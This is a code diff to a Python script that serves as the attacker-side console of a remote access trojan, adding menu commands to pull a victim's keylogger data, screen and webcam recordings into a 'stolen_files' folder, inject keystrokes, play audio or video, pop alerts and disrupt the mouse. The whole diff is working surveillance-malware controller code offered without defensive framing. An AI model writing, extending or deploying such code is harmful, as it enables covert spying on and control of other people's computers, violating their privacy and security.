@@ -2,7 +2,7 @@ import os
 import socket
 import inquirer
 
-host = "172.31.41.57"
+host = ""
 port = 5588
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -18,15 +18,117 @@ while True:
         "commands",
         message="Select command",
         choices = [
-            "Get keylogger.txt",
+            "Get keylogger",
+            "Get screen recording",
+            "Get camera recording",
+            "Play audio",
+            "Send alert",
+            "Enter keyboard command",
+            "Bug victim's mouse",
+            "Play video",
             "File system",
             "Disconnect"
         ]
     )]
     command = inquirer.prompt(list)["commands"]
     conn.send(command.encode())
-    if command == "Get keylogger.txt":
-        pass
+    if command == "Get keylogger":
+        file_data = conn.recv(1024)
+        file_buffer = b""
+        conn.settimeout(1)
+        while file_data:
+            file_buffer = b"".join([file_buffer, file_data])
+            try:
+                file_data = conn.recv(1024)
+            except socket.timeout:
+                break
+        conn.settimeout(None)
+        os.chdir("stolen_files")
+        file = open("keylogger.txt", "wb")
+        file.write(file_buffer)
+        file.close()
+        os.chdir("..")
+    elif command == "Get screen recording":
+        total_seconds = input("Number of seconds for screen recording: ")
+        conn.send(total_seconds.encode())
+        file_data = conn.recv(1024)
+        file_buffer = b""
+        conn.settimeout(1)
+        while file_data:
+            file_buffer = b"".join([file_buffer, file_data])
+            try:
+                file_data = conn.recv(1024)
+            except socket.timeout:
+                break
+        conn.settimeout(1)
+        os.chdir("stolen_files")
+        file = open("screenrecord.mp4", "wb")
+        file.write(file_buffer)
+        file.close()
+        os.chdir("..") 
+    elif command == "Get camera recording":
+        total_seconds = input("Number of seconds for camera recording: ")
+        conn.send(total_seconds.encode())
+        file_data = conn.recv(1024)
+        file_buffer = b""
+        conn.settimeout(1)
+        while file_data:
+            file_buffer = b"".join([file_buffer, file_data])
+            try:
+                file_data = conn.recv(1024)
+            except socket.timeout:
+                break
+        conn.settimeout(None)
+        os.chdir("stolen_files")
+        file = open("camrecording.mp4", "wb")
+        file.write(file_buffer)
+        file.close()
+        os.chdir("..") 
+    elif command == "Play audio":
+        list = [inquirer.List(
+            "commands",
+            message="Select a command",
+            choices = [
+                "Play an MP3",
+                "Create a text-to-speech",
+                "Quit"
+            ]
+        )]
+        command = inquirer.prompt(list)["commands"]
+        if command == "Play an MP3":
+            conn.send("1 1".encode())
+        elif command == "Create a text-to-speech":
+            text = input("Enter text to convert to speech: ")
+            text = "|".join(text.split(" "))
+            conn.send(("1 2 " + text).encode())
+    elif command == "Send alert":
+        alertTitle = input("Enter title for alert: ")
+        alertMessage = input("Enter message for alert: ")
+        alertTitle = "|".join(alertTitle.split(" "))
+        alertMessage = "|".join(alertMessage.split(" "))
+        conn.send(("2 " + alertTitle + " " + alertMessage).encode())
+    elif command == "Enter keyboard command":
+        list = [inquirer.List(
+            "commands",
+            message="Select a keyboard interaction",
+            choices = [
+                "Typing",
+                "Command",
+                "Quit"
+            ]
+        )]
+        command = inquirer.prompt(list)["commands"]
+        keys = input("Enter keys in csv format (no spaces): ")
+        if command == "Typing":
+            conn.send(("3 1 " + keys).encode())
+        elif command == "Command":
+            conn.send(("3 2 " + keys).encode())
+        else:
+            break
+    elif command == "Bug victim's mouse":
+        conn.send("4".encode())
+    elif command == "Play video":
+        conn.send("5".encode())
     elif command == "File system":
         while True:
             list = [inquirer.List(
